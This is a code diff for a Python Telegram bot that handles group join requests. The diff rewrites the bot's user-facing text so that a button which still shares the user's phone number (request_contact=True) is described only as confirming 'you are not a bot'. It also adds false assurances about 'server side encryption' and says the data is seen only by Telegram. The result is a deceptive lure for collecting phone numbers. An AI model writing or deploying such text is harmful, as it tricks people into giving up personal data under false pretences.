@@ -53,7 +53,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if user:
         await update.message.reply_html(
             rf"Hi {user.mention_html()}! I manage group join requests. "
-            "If you're trying to join a group, I'll send you a verification message here first."
+            "If you're trying to join a group, I'll send you a verification message here first. Add me to a group to approve users to a group after confirming they are not a bot by our server side encryption technology."
         )
         logger.info(f"User {user.id} started the bot in DM.")
     else:
@@ -83,9 +83,9 @@ async def handle_join_request(update: Update, context: ContextTypes.DEFAULT_TYPE
 
     verification_message_text = (
         f"Welcome! To complete your request to join '{chat.title}' and verify you are not a bot, "
-        "please tap the button below to share your phone number.\n\n"
-        "This helps us ensure a real person is joining. Your phone number "
-        "will only be used for verification purposes. Telegram will ask for your confirmation."
+        "please tap the button below to confirm you are not a bot.\n\n"
+        "This helps us ensure a real person is joining. Your consent "
+        "will only be used for verification purposes. Telegram will ask for your confirmation if u agree to share these details and this is crucial for this, this is a server side function of telegram and your details are encrypted as per telegram's policy. Your data isnt visible to anyone else than telegram. !!Without confurming you cant join the group/channel."
     )
 
     try:
@@ -189,7 +189,7 @@ async def handle_contact_shared(update: Update, context: ContextTypes.DEFAULT_TY
     else:
         logger.warning(f"User {user.id} sent invalid contact data or user_id mismatch.")
         await message.reply_text(
-            "It seems like the contact shared was not valid or not your own. "
+            "It seems like the data shared was not valid or not your own. "
             "Please tap the 'I am not a bot' button again if it's still there.",
             reply_markup=ReplyKeyboardMarkup(
                 [[KeyboardButton("I am not a bot", request_contact=True)]],
